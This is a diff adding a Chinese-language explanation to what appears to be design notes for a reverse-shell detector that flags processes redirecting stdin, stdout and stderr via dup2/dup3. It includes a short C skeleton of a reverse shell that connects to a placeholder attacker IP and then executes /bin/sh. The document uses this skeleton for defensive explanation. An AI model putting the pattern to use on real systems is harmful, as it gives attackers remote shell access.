@@ -417,6 +417,32 @@
 
 **先記這句核心**：任何 reverse shell 都得把 stdin(0)/stdout(1)/stderr(2) 三個標準 fd 都接到同一條 socket，才拿得到互動式 shell。我們對每個行程記一個 3-bit 的 bitmask，記哪幾個 fd 被 `dup2` 接走，三個全亮（`0x07`）就確認、就殺。**看行為、不看 port。**
 
+#### 底層觀念：fd / `dup2` / `dup3` 與 reverse shell 的關聯（被問到名詞時的完整版）
+
+**fd（file descriptor）是什麼** — Linux 裡每個開啟的檔案／socket／pipe，程式都用一個小整數來指它，叫 file descriptor。三個是固定的標準通道：
+
+- `fd 0 = stdin`（標準輸入，程式從這讀指令）
+- `fd 1 = stdout`（標準輸出，程式往這印結果）
+- `fd 2 = stderr`（標準錯誤）
+
+**`dup2` / `dup3` 做什麼** — 都是「複製 fd」的系統呼叫：
+
+- `dup2(oldfd, newfd)` — 讓 `newfd` 指向跟 `oldfd` 同一個東西（newfd 原本開著的會先關掉）。例：`dup2(sock, 1)` ＝「程式往 stdout 寫的東西，實際上全從那條 socket 送出去」。
+- `dup3(oldfd, newfd, flags)` — 跟 dup2 幾乎一樣，只多一個 `flags` 參數（最常見是 `O_CLOEXEC` ＝ exec 時自動關閉）。
+- ⚠ Python 的 `os.dup2(fd, fd2, inheritable=False)`（這是預設）底層其實是呼叫 `dup3` → 所以 `dup2`/`dup3` 兩個都要掛，不然會漏掉 Python 寫的 reverse shell。
+
+**為什麼 reverse shell 一定要用它** — reverse shell ＝ 受害機主動連回攻擊者、給對方一個「能互動」的 shell。要能互動，攻擊者得能打字進去、看得到輸出 → 必須把 shell 行程的 stdin/stdout/stderr 三個通道全接到那條回連 socket，手段就是 dup2/dup3：
+
+```c
+int s = socket(...); connect(s, 攻擊者IP, ...);   // 連回攻擊者
+dup2(s, 0);   // shell 從 socket 讀指令 ← 攻擊者鍵盤輸入
+dup2(s, 1);   // 輸出寫回 socket       ← 攻擊者看得到
+dup2(s, 2);   // 連錯誤訊息也送回去
+execve("/bin/sh", ...);               // 換成 shell，I/O 已經是網路
+```
+
+四步做完，`/bin/sh` 的輸入輸出就「長」在那條 socket 上，攻擊者那端就拿到一個可互動的命令列。**這就是下面狀態機要抓的行為**：同一行程把 fd 0/1/2 三個都接走 → bitmask 湊滿 `0x07`。
+
 #### 圖①｜bitmask 狀態機（`fig:dup2`：`000 → 001 → 011 → 111 → SIGKILL`）
 
 | 追問 | 一句話回答 |
